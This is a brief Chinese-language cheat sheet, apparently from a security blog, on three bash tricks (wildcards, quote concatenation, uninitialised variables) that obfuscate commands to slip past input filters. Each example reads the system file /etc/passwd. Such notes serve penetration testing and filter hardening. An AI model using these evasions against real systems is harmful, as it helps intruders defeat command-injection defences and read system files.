0x01 技巧一：通配符
[vagrant@localhost ~]$ /?in/cat /?tc/p?sswd

0x02 技巧二：连接符
要注意''的闭合
echo 'h'ell'o'
echo /'b'i'n'/'c'a't' /'e't'c'/'p'a's's'w'd



0x03 技巧三：未初始化的bash变量
在bash环境中允许我们使用未初始化的bash变量，如何
我们事先并没有定义它们，输出看看：
未初始化的变量值都是null。
还是读取/etc/passwd：
cat$a /etc$add/passwd$fdf